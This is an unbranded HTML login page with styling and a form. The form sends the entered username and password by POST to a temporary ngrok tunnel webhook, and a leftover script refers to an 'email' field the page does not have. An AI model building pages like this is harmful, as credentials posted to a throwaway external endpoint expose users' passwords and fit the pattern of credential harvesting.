<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      height: 100vh;
      background: url('https://images.pexels.com/photos/1570779/pexels-photo-1570779.jpeg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .login-box {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 16px;
      padding: 40px;
      width: 350px;
      backdrop-filter: blur(20px);
      color: white;
      box-shadow: 0 0 40px rgba(0,0,0,0.5);
    }

    .login-box h2 {
      text-align: center;
      margin-bottom: 30px;
      font-size: 28px;
    }

    .input-group {
      margin-bottom: 20px;
    }

    .input-group label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
    }

    .input-group input {
      width: 100%;
      padding: 10px 14px;
      border: none;
      border-radius: 8px;
      background: rgba(255, 255, 255, 0.1);
      color: white;
      font-size: 15px;
    }

    .input-group input:focus {
      outline: none;
      background: rgba(255, 255, 255, 0.2);
    }

    .options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 13px;
      margin-bottom: 20px;
    }

    .options a {
      color: #bce0ff;
      text-decoration: none;
    }

    .options input[type="checkbox"] {
      margin-right: 5px;
    }

    .btn {
      width: 100%;
      background: white;
      color: #333;
      border: none;
      padding: 12px;
      border-radius: 30px;
      font-size: 16px;
      cursor: pointer;
      font-weight: bold;
    }

    .btn:hover {
      background: #e1e1e1;
    }

    .register {
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
    }

    .register a {
      color: #bce0ff;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h2>Login</h2>
    <form action="https://1b79852bfb29.ngrok-free.app/webhook-test/6ccbcc0a-4830-4f13-aeb7-1a2eb89f3ce8" method="POST">
      <div class="input-group">
        <label>Username</label>
        <input type="text" name="username" required>
      </div>

      <div class="input-group">
        <label>Password</label>
        <input type="password" name="password" required>
      </div>

       

      <button type="submit" class="btn">Log in</button>
    </form>

    
  </div>
  <script>
    function restoreSession() {
      const savedEmail = sessionStorage.getItem('email');
      if (savedEmail) {
        document.getElementById('email').value = savedEmail;
      }
    }
  
    // Restore on load
    window.addEventListener('load', restoreSession);
  
    // Also restore on back/forward navigation
    window.addEventListener('pageshow', function (event) {
      if (event.persisted) {
        restoreSession();
      }
    });
  </script>
  
</body>
</html>
